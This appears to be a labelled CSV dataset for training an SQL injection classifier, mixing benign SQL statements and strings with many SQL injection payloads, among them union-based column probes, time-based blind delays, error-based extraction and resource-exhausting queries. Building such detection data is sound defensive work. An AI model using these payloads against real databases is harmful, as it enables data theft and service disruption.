Query,SELECT,UNION,OR,AND,Label
SELECT fox FROM first UNION SELECT breakfast FROM mouse ORDER BY silk,1,1,1,0,0
lauze,0,0,0,0,0
SELECT * FROM burn WHERE race BETWEEN voyage09/01/1996paid AND secret15/31/1996goes,1,0,0,1,0
96639593x,0,0,0,0,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3#",1,0,0,0,1
SELECT * FROM motor  WHERE rhyme = original,1,0,1,0,0
"1 where 7072  =  7072 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1,1,1,1,1
61371247w,0,0,0,0,0
sayara,0,0,0,0,0
"  SELECT LAST_DAY ( ""2017-06-20"" ) ;",1,0,0,0,0
tanglao,0,0,0,0,0
raddalgo,0,0,0,0,0
"1'  )   where 7587  =  7587 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,0,1,0,1
" select * from users where id  =  '1' union select +\#,@@VERSION -- 1'",1,1,0,0,1
SELECT color ( s )  FROM mixture,1,0,1,0,0
"1'  )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",0,0,0,1,1
SELECT * FROM speech,1,0,0,0,0
char%4039%41%2b%40SELECT,1,0,0,0,1
SELECT exchange,1,0,0,0,0
ejarque barbieri,0,0,0,0,0
maridel,0,0,0,0,0
"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",1,1,0,0,1
"1""  )   where 2388  =  2388 union all select null,null,null,null,null,null,null,null,null--",1,1,0,0,1
DELETE FROM eight,0,0,0,0,0
SELECT * FROM call WHERE Price NOT BETWEEN 10 AND 20,1,0,0,1,0
SELECT MIN ( compound )  AS underline FROM crowd,1,0,0,0,0
"1%'   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,0,1,0,1
SELECT option_value FROM wp_options WHERE option_name  =  'houzez_settings' LIMIT 1,1,0,0,0,0
" SELECT * FROM blank ORDER BY label, engine",1,0,1,0,0
"1',  (  select   (  case when   (  9644  =  9644  )   then dbms_pipe.receive_message  (  chr  (  75  )  ||chr  (  78  )  ||chr  (  104  )  ||chr  (  98  )  ,5  )   else 1/  (  select 0 from dual  )   end  )   from dual  )  ",1,0,0,0,1
"iif  (  8214  =  4954,1,1/0  )  ",0,0,0,0,1
"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'fdoc' like 'fdoc",1,1,1,1,1
"  SELECT waitID AS ID, where AS apartment FROM closely",1,0,0,0,0
"-4964""   )    )    union all select 4750,4750,4750,4750,4750--",1,1,0,0,1
"-3035""  )   union all select 7912,7912,7912#",1,1,0,0,1
1'  )   where 6440  =  6440 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,0,1,0,1
6rce8o,0,0,0,0,0
"1""  )   as ymsc where 3694  =  3694 waitfor delay '0:0:5'--",0,0,1,0,1
"1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1,0,1,0,1
SELECT * FROM hearing,1,0,0,0,0
"-6085 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1,0,1,0,1
"-3315""   )    )     )   union all select 2457,2457,2457,2457,2457,2457--",1,1,0,0,1
oseja,0,0,0,0,0
DELETE FROM behavior WHERE brain = 'unhappy',0,0,1,0,0
SELECT AVG ( driven ) FROM length,1,0,0,0,0
"1  )   as wust where 3884  =  3884 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,0,0,1,1
"   SELECT zero,plenty,dress,temperature,nails     (  (  cotton JOIN where ON opportunity.bag =  similar.grass )   INNER JOIN coatON Orders.caught =  shot.gooseID ) ",1,0,1,0,0
SELECT blood ( s )  FROM ate UNION ALL,1,1,0,0,0
SELECT hit ( s )  FROM smile FULL OUTER JOIN,1,0,0,0,0
"1   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  5199  =  5199",1,0,0,1,1
SELECT * FROM fill WHERE want = 'fellow'  OR mad = 'making',1,0,1,0,0
"1""  )   rlike   (  select   (  case when   (  5746  =  5367  )   then 1 else 0x28 end   )    )    and   (  ""hnnf"" like ""hnnf",1,0,0,1,1
SELECT * FROM tired WHERE Price NOT BETWEEN 10 AND 20,1,0,0,1,0
SELECT solve FROM popular UNION SELECT find FROM helpful ORDER BY wheel,1,1,1,0,0
SELECT MIN ( pay )  AS unhappy FROM driving,1,0,0,0,0
"or 0  =  0 #""",0,0,1,0,1
"   SELECT weak, bound+ ', ' + vessels+ ' ' + cage+ ', ' + pole AS union  FROM highway",1,1,0,0,0
"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and ""uvoq"" like ""uvoq",1,0,1,1,1
SELECT pot FROM promised,1,0,0,0,0
backes@kimkardashian.com.lk,0,0,0,0,0
50269,0,0,0,0,0
leiza,0,0,0,0,0
5.01063E+15,0,0,0,0,0
"   SELECT class, fast, offer FROM beside WHERE arrive  IS NULL",1,0,0,0,0
koock@aridossanchez.mt,0,0,0,0,0
1  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,1,0,0,1,1
SELECT ancient ( s ) FROM driving INNER JOIN,1,0,0,0,0
"1""   )    )    as oiqr where 4073  =  4073 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,0,1,0,1
"1  )   union all select null,null,null,null,null,null,null,null,null#",1,1,0,0,1
lttecke,0,0,0,0,0
"1""   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""wdye"" like ""wdye",1,0,1,1,1
SELECT * FROM  ( SELECT religious FROM coast ) ,1,0,0,0,0
SELECT * FROM running WHERE deal BETWEEN shown09/01/1996pie AND recognize15/31/1996got,1,0,0,1,0
"  SELECT pony AS vessels, dig AS [matter]  FROM anyway",1,0,0,0,0
"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",0,0,1,0,1
SELECT shore ( s )  FROM statement SELECT then FROM clock,1,0,1,0,0
divinizacin,0,0,0,0,0
SELECT * FROM amount WHERE facing LIKE '%certain%',1,0,0,0,0
62386870z,0,0,0,0,0
"1""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""mhfc""  =  ""mhfc",1,0,1,1,1
fitness,0,0,0,0,0
melucci,0,0,0,0,0
"-1287""  )   as bbzg where 1475  =  1475 union all select 1475,1475,1475,1475,1475,1475,1475,1475,1475#",1,1,0,0,1
" select * from users where id  =  1 or ""1]"" or 1  =  1 -- 1",1,0,1,0,1
" select * from users where id  =  1 or "";  )  ""  =  1 or 1  =  1 -- 1",1,0,1,0,1
"1'   )    )    as uncy where 8009  =  8009 union all select null,null,null,null,null,null,null,null,null#",1,1,0,0,1
SELECT fresh ( s )  FROM growth SELECT electric ( s ) ,1,0,0,0,0
"1"" where 5098  =  5098 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",1,0,0,1,1
-3966'  )   or 7338  =  8657,0,0,1,0,1
"  SELECT * FROM cotton WHERE kids NOT IN  ( 'within', 'connected', 'pattern' )  ",1,0,0,0,0
"  SELECT Orders.zerorID, Employees.as, Employees.fireplace FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.solidID ORDER BY Orders.structureID",1,0,1,0,0
SELECT AVG ( shop ) FROM yes SELECT SUM ( front ) ,1,0,0,0,0
1'||  (  select 'ptkj' from dual where 6263  =  6263 union all select null--,1,1,0,0,1
"-4136'   )    )    as cczp where 7052  =  7052 union all select 7052,7052,7052,7052,7052,7052,7052,7052,7052,7052#",1,1,0,0,1
"select count  (  *  )   from generate_series  (  1,5000000  )  #",1,0,0,0,1
"1""  )   as duvm where 6190  =  6190 order by 1--",0,0,1,0,1
santaniello_tabernero@enfuerteventura.com.ni,0,0,0,0,0
millana,0,0,0,0,0
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c881b67715' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",1,0,1,1,0
"-1447"" union all select 3013,3013,3013,3013,3013,3013,3013--",1,1,0,0,1
78739097t,0,0,0,0,0
lawlik@housemovie.lk,0,0,0,0,0
"-5898""   )    )    as fycd where 7135  =  7135 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,0,1,0,1
"1'  )   as sjzi where 8242  =  8242 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,0,0,1,1
"-7347""   )    )    union all select 4360,4360,4360,4360,4360,4360,4360,4360,4360#",1,1,0,0,1
"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",0,0,1,0,1
-1866'   )    )    as cwtv where 3295  =  3295 order by 1--,0,0,1,0,1
SELECT AVG ( shot ) FROM design,1,0,0,0,0
"   SELECT general, hay, environment FROM bicycle WHERE soon  IS NULL",1,0,0,0,0
SELECT * FROM garage WHERE Price NOT BETWEEN 10 AND 20,1,0,0,1,0
"-1823 where 6852  =  6852 union all select 6852,6852,6852,6852,6852,6852#",1,1,0,0,1
SELECT * FROM taken 3,1,0,0,0,0
"vendrell, el",0,0,0,0,0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",0,0,0,1,1
 (  select   (  case when   (  3348  =  1710  )   then 3348 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  ) ,1,0,0,0,1
SELECT * FROM birthday WHERE    NOT test = 'pride',1,0,0,0,0
"-7579%"" or 6570  =  1764",0,0,1,0,1
"robert graves, 101",0,0,0,0,0
"  (  select 1 from generate_series  (  8515,8515,case when   (  8515  =  3477  )   then 1 else 0 end  )   limit 1  )  ",1,0,0,0,1
1' in boolean mode  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,0,0,1,1
"1"" and 2006  =  2006",0,0,0,1,1
1'  )   as imgv where 7802  =  7802,0,0,0,0,1
SELECT * FROM carried WHERE Price NOT BETWEEN 10 AND 20,1,0,0,1,0
"1'||  (  select 'yags' where 6268  =  6268 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   ||'",1,0,0,1,1
desnudez,0,0,0,0,0
-6712'   )    )    as kqff where 9146  =  9146 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1,0,1,0,1
"-5826""   )    )    union all select 7192,7192#",1,1,0,0,1
dagmar,0,0,0,0,0
"INSERT INTO pressure ( giving, prize, powder, mail, work, common )  VALUES  ( 'chosen', 'roll'. characteristic', 'somebody', 'soon', 'before', 'rest' )  ",0,0,1,0,0
SELECT * FROM eight FETCH FIRST 50 PERCENT ROWS ONLY,1,0,0,0,0
1'   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'kkgt'  =  'kkgt,1,0,0,1,1
"1%'   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",0,0,0,1,1
"1"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and ""wcze""  =  ""wcze",1,0,0,1,1
SELECT * FROM sing WHERE shot = 'build',1,0,0,0,0
kipp,0,0,0,0,0
"1%""  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,0,0,1,1
4.10842E+15,0,0,0,0,0
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367652 ) ,1,0,0,0,0
"   SELECT COUNT ( machine ) , pack FROM layers BY weak",1,0,0,0,0
SELECT * FROM nothing WHERE milk BETWEEN '1996-07-01' AND '1996-07-31',1,0,0,1,0
DELETE FROM wooden,0,0,0,0,0
1%'   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,0,1,0,1
mcnear.trotta@lettere.ve,0,0,0,0,0
if  (  7340  =  9813  )   select 7340 else drop function yppp--,1,0,0,0,1
DELETE FROM pink,0,0,0,0,0
7.40029E+15,0,0,0,0,0
39499084b,0,0,0,0,0
to85lo372,0,0,0,0,0
1'  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  'mizk'  =  'mizk,1,0,0,1,1
SELECT DISTINCT wire FROM impossible,1,0,0,0,0
DELETE FROM thought WHERE black = 'declared',0,0,0,0,0
mae,0,0,0,0,0
SELECT TOP 3 * FROM news WHERE form = 'upon',1,0,1,0,0
SELECT * FROM married WHERE Price NOT BETWEEN 10 AND 20,1,0,0,1,0
SELECT * FROM dance ORDER BY dark,1,0,1,0,0
6991,0,0,0,0,0
9.54368E+15,0,0,0,0,0
"1'   )    )    as orvy where 7270  =  7270 union all select null,null,null,null,null,null,null,null#",1,1,1,0,1
SELECT * FROM generally WHERE master = 'right' FETCH FIRST 3 ROWS ONLY,1,0,0,0,0
"1'  )   as rqfq where 7077  =  7077 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,0,1,0,1
91436910l,0,0,0,0,0
"1  )   where 3740  =  3740 union all select null,null,null,null,null,null,null,null--",1,1,0,0,1
8615,0,0,0,0,0
pelayos,0,0,0,0,0
21924971z,0,0,0,0,0
29385081m,0,0,0,0,0
" select * from users where id  =  1 or ""{  (  ""  =  1 or 1  =  1 -- 1",1,0,1,0,1
"calle poligon industrial ""el segre"", 118",0,0,0,0,0
"   SELECT again, final, never FROM disease WHERE fat  IS NULL",1,0,0,0,0
1'||  (  select 'rdqv' from dual where 1894  =  1894,1,0,0,0,1
SELECT AVG ( movie ) FROM modern,1,0,0,0,0
coxcojita,0,0,0,0,0
castil de vela,0,0,0,0,0
SELECT * FROM union WHERE wonderful NOT LIKE 'horse%',1,1,1,0,0
1   )    )    as ojjk where 3687  =  3687 and   (  4833  =  9218  )  *9218--,0,0,0,1,1
SELECT * FROM CustomersWHERE Country = 'Germany'LIMIT 3;,1,0,0,0,0
"   SELECT underline,in,whispered,eight,brave     (  (  command JOIN rise ON jar.bank =  strong.heavy )   INNER JOIN oceanON Orders.crew =  frighten.chanceID ) ",1,0,1,1,0
1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   -- yczq,1,0,0,1,1
"-5969"" where 9248  =  9248 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,0,1,0,1
"1'||  (  select 'xbwg' where 7518  =  7518 union all select null,null,null,null,null,null--",1,1,0,0,1
"1"" and elt  (  4249  =  4249,7259  )   and ""kgtz"" like ""kgtz",0,0,0,1,1
 UPDATE moment SET sell = 'lay'WHERE trick = 'managed',0,0,0,0,0
SELECT * FROM grown WHERE automobile = 'milk'  OR control = 'wild',1,0,1,0,0
danisa,0,0,0,0,0
SELECT * FROM thrown WHERE advice BETWEEN 'chest' AND 'uncle',1,0,0,1,0
SELECT TOP 3 * FROM arrow WHERE having = 'corn',1,0,1,0,0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  '%'  =  '",1,0,0,1,1
select * from users where id  =  1 <@ or 1  =  1 -- 1,1,0,1,0,1
DELETE FROM mood,0,0,0,0,0
34239,0,0,0,0,0
"1  )   where 5309  =  5309 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,0,1,0,1
67242195q,0,0,0,0,0
17403,0,0,0,0,0
"1%""  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,0,0,1,1
SELECT * FROM practice WHERE afternoon = 'father'  AND  ( wash = 'creature' OR correct = 'yellow' ) ,1,0,1,1,0
propaganda,0,0,0,1,0
71648159p,0,0,0,0,0
SELECT TOP 3 * FROM song WHERE shout = 'young',1,0,0,0,0
SELECT AVG ( edge ) FROM wheat SELECT SUM ( sing ) ,1,0,0,0,0
select   (  case when   (  7163  =  1777  )   then 1 else 7163*  (  select 7163 from master..sysdatabases  )   end  )  --,1,0,0,0,1
-7466 where 5161  =  5161 or 3038  =  3038,0,0,1,0,1
SELECT * FROM laugh,1,0,0,0,0
"  SELECT taste AS zoo, black AS [form]  FROM musical",1,0,1,0,0
"1"" where 1683  =  1683 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",1,0,1,0,1
duilio,0,0,0,0,0
SELECT * FROM coal ORDER BY beside DESC,1,0,1,0,0
"1"" where 1203  =  1203 union all select null,null,null--",1,1,0,0,1
SELECT DISTINCT nobody FROM nice,1,0,0,0,0
SELECT SUM (  column_name  )  FROM table_name WHERE condition ;,1,0,0,0,0
SELECT * FROM ruler WHERE master NOT LIKE '[before]%',1,0,1,0,0
SELECT * FROM fallen  WHERE leg = ought,1,0,0,0,0
"   SELECT individual, decide, milkFROM deeply WHERE citizen  IS NOT NULL",1,0,0,0,0
segovia,0,0,0,0,0
SELECT egg FROM roof,1,0,0,0,0
august,0,0,0,0,0
SELECT AVG ( great ) FROM product SELECT SUM ( cool ) ,1,0,0,0,0
mamakos@palodegolf.com.rw,0,0,0,0,0
ajaraca,0,0,0,0,0
gater9,0,0,0,0,0
1%'   )    )     )   union all select null--,1,1,0,0,1
9.55315E+15,0,0,0,0,0
SELECT MIN ( pig )  AS pack FROM soil,1,0,0,0,0
azcrate campalan,0,0,0,0,0
"  UPDATE women SET baseball =  'person', City =  'traffic' WHERE small =  boat",0,0,0,0,0
DELETE FROM rubber WHERE how = 'dirty',0,0,0,0,0
SELECT * FROM rear WHERE recently = 'finger'  AND  ( next = 'depend' OR snake = 'rate' ) ,1,0,1,1,0
SELECT AVG ( exchange ) FROM division SELECT SUM ( suit ) ,1,0,0,0,0
"-7887'  )   union all select 9049,9049,9049,9049,9049,9049,9049,9049,9049,9049#",1,1,0,0,1
25254382z,0,0,0,0,0
"1""  )   where 3404  =  3404 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",0,0,0,1,1
tali,0,0,0,0,0
"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf",0,0,1,1,1
6.96678E+15,0,0,0,0,0
"1%"" and make_set  (  2905  =  5725,5725  )   and ""%""  =  """,0,0,0,1,1
werkmeister@19horas.zr,0,0,1,0,0
1%'   )    )     )   union all select null#,1,1,0,0,1
1'||  (  select 'ussi' where 8958  =  8958,1,0,0,0,1
SELECT * FROM vowel WHERE test BETWEEN 'additional' AND 'won',1,0,0,1,0
botosso@mytanga.cf,0,0,0,0,0
"  UPDATE chart SET pleasant =  'diameter', City =  'post' WHERE get =  diagram",0,0,0,0,0
98810075m,0,0,0,0,0
takakura@cenitsoria.sb,0,0,1,0,0
SELECT * FROM leave WHERE church NOT BETWEEN 'combine' AND 'shout',1,0,0,1,0
"INSERT INTO silly  ( respect, receive, circle )  VALUES  ( 'nodded', 'statement', 'beauty' )  ",0,0,0,0,0
"1  )   where 5234  =  5234 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",0,0,1,0,1
SELECT * FROM manufacturing WHERE inside BETWEEN studied09/01/1996kept AND entirely15/31/1996damage,1,0,0,1,0
"1' in boolean mode  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",0,0,0,1,1
368,0,0,0,0,0
SELECT TOP 3 * FROM nervous SELECT * FROM screen 3SELECT * FROM aware,1,0,0,0,0
1'+  (  select 'leok' where 4320  =  4320,1,0,0,0,1
SELECT TOP 3 * FROM spite WHERE speech = 'attack' SELECT * FROM society,1,0,0,0,0
"-1303' union all select 4840,4840#",1,1,0,0,1
8.73E+15,0,0,0,0,0
gustat0v4,0,0,0,0,0
"  SELECT YEAR ( ""2017-06-15"" ) ;",1,0,0,0,0
"1  )   where 8008  =  8008 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,0,0,1,1
abdel-az,0,0,0,0,0
"pl. poeta badenes, 48, 11-c",0,0,0,0,0
"1' where 2123  =  2123 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",0,0,1,1,1
"SELECT * FROM needs WHERE pleasant BETWEEN ""fewer"" AND    ""blood""",1,0,0,1,0
corcoy augu,0,0,1,0,0
andrade escriba,0,0,0,1,0
 UPDATE wave SET load = 'speak'WHERE carry = 'probably',0,0,0,0,0
"1""  )   union all select null,null,null,null,null,null,null,null,null,null#",1,1,0,0,1
"1   )    )    union all select null,null,null,null,null,null,null,null,null,null--",1,1,0,0,1
1'||  (  select 'blvu' from dual where 9813  =  9813,1,0,0,0,1
-8760  )   where 8277  =  8277 union all select 8277--,1,1,0,0,1
salinillas de bureba,0,0,0,0,0
SELECT * FROM bee FETCH FIRST 50 PERCENT ROWS ONLY,1,0,0,0,0
"1""   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""adwg"" like ""adwg",1,0,1,1,1
valdelinares,0,0,0,0,0
aineln,0,0,0,0,0
SELECT TOP 3 * FROM exact,1,0,0,0,0
09899393d,0,0,0,0,0
ayat rozas,0,0,0,0,0
mazursky@mundo-deportivo.mx,0,0,1,0,0
" select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",1,0,1,0,1
SELECT * FROM think WHERE consist = 'face',1,0,0,0,0
; if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --,1,0,1,0,1
"1%'   )    )     )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",0,0,0,1,1
"1' in boolean mode  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   #",1,0,0,1,1
"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",1,1,0,0,1
"1'   )    )    and elt  (  6847  =  5874,5874  )   and    (    (   'yspu'  =  'yspu",0,0,0,1,1
"SELECT CONCAT ( ""SQL "", ""Tutorial "", ""is "", ""fun!"" )  AS ConcatenatedString;",1,0,1,0,0
SELECT * FROM zero FETCH FIRST 3 ROWS ONLY,1,0,0,0,0
SELECT * FROM gentle WHERE lose = 'cut' LIMIT 3,1,0,0,0,0
sabadell,0,0,0,0,0
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   ""bhmu"" like ""bhmu",1,0,0,1,1
SELECT farther ( s FROM two RIGHT JOIN,1,0,0,0,0
SELECT * FROM scientific WHERE stage LIKE '%happy%',1,0,0,0,0
barlas,0,0,0,0,0
DELETE FROM electric WHERE remarkable = 'drew',0,0,0,0,0
"  SELECT contrastID AS ID, silent AS fierce FROM heard",1,0,0,0,0
tabakov@wdsl.ly,0,0,0,0,0
1  )   where 4573  =  4573,0,0,0,0,1
"1""   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1,0,0,1,1
SELECT * FROM area FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM during,1,0,0,0,0
SELECT option_value FROM wp_options WHERE option_name  =  '_transient_houzez_verification_success' LIMIT 1,1,0,0,0,0
"1,  (  select   (  case when   (  8392  =  8404  )   then 1 else 8392*  (  select 8392 from information_schema.character_sets  )   end   )    )   ",1,0,1,0,1
SELECT species ( s )  FROM heart UNION ALL,1,1,0,0,0
"1%""  )   and 9764  =  6037 and   (  ""%""  =  """,0,0,0,1,1
select case when 4488  =  5522 then 1 else null end--,1,0,0,0,1
"1 where 5099  =  5099 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",0,0,0,1,1
SELECT * FROM trouble WHERE organization = 'bottom' FETCH FIRST 3 ROWS ONLY,1,0,1,0,0
SELECT TOP 3 * FROM belong WHERE old = 'closer' SELECT * FROM him,1,0,0,0,0
harold_veigel@ilusionarium.sk,0,0,0,0,0
SELECT COUNT ( DISTINCT danger )  FROM fallen,1,0,0,0,0
SELECT * FROM heart FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM jar,1,0,0,0,0
"  SELECT fix AS hollow, dull AS [recall]  FROM over",1,0,0,0,0
5229,0,0,0,0,0
1%'   )    )    rlike   (  select   (  case when   (  6094  =  7893  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',1,0,0,1,1
6.29894E+15,0,0,0,0,0
"-6254%'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,0,1,1,1
8547,0,0,0,0,0
